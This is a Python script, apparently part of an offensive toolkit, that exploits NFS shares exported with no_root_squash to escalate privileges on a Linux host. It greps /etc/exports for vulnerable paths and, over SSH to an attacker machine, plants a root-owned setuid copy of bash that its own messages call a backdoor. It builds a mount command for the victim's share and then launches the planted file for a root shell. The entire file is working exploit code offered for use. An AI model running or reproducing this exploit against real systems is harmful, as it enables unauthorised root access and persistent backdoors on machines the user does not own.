import subprocess as sub
import Utils.output_handler as oh

def nfs_exploit(
    ip: str,
    attacker_ip: str,
    ssh_port: str,
) -> None:
    
    command = "cat /etc/exports | grep no_root_squash"
    attacker_username = 'root'

    nfs_folder = "mkdir -p /tmp/nfs_mount &&"
    nfs_file = "touch /tmp/nfs_mount/bash_root &&"
    
    cp_bash_file = "cp /bin/bash /tmp/nfs_mount/bash_root &&"
    file_perm_handler = (
        "chown root:root /tmp/nfs_mount/bash_root && "
        "chmod +xs /tmp/nfs_mount/bash_root"
    )

    full_command = [nfs_folder, nfs_file, cp_bash_file, file_perm_handler]
    ssh_command = f'''
    ssh -p {ssh_port} {attacker_username}@{attacker_ip} "{' '.join(full_command)}"
    '''

    try:
        run_cmd = sub.run(
            command, text=True, capture_output=True, check=True, shell=True
        )
        output = run_cmd.stdout.splitlines()

        oh.output_handler(is_error=not bool(output), message="No export found with 'no_root_squash'")

        red_flag = "no_root_squash"

        paths_dict = [
            {line.split(" ")[0]: red_flag in line.split(" ")[1]} for line in output
        ]

        vun_paths = [key for d in paths_dict for key, v in d.items() if v]

        oh.output_handler(is_error=not bool(output), message="No vulnerable NFS path found.")

        mount_command = f"sudo -S mount -t nfs {ip}:{vun_paths[0]} /tmp/nfs_mount"
        full_command.append(mount_command)

        vuln_paths_list = "\n".join(f"[yellow]- {path}[/yellow]" for path in vun_paths)
        mount_suggestion = f"[dim]{mount_command}[/dim]"

        oh.output_handler(
            with_panel=True,
            message=(
                f"[bold green][+][/bold green] NFS vulnerability found!\n\n"
                f"[green]Vulnerable paths:[/green]\n{vuln_paths_list}\n\n"
                f"[green]Suggested mount command:[/green]\n{mount_suggestion}\n\n"
                f"[cyan]Preparing SSH command to inject backdoor...[/cyan]"
            ),
            title="NFS Exploit",
            border_style="green",
        )

        remote_execution = sub.run(
            ssh_command,
            check=True,
            capture_output=True,
            text=True,
            shell=True,
        )

        if not remote_execution.stderr:
            run_exploit = f"{vun_paths[0]}/bash_root"

            oh.output_handler(
                message=f"[green][+][/green] Launching root shell from: [dim]{run_exploit}[/dim]"
            )

            sub.run(run_exploit, shell=True)

    except sub.CalledProcessError as e:
        oh.output_handler(
            is_error=True,
            message="An Error Occurred: ", 
            error_detail=e.stderr
        )
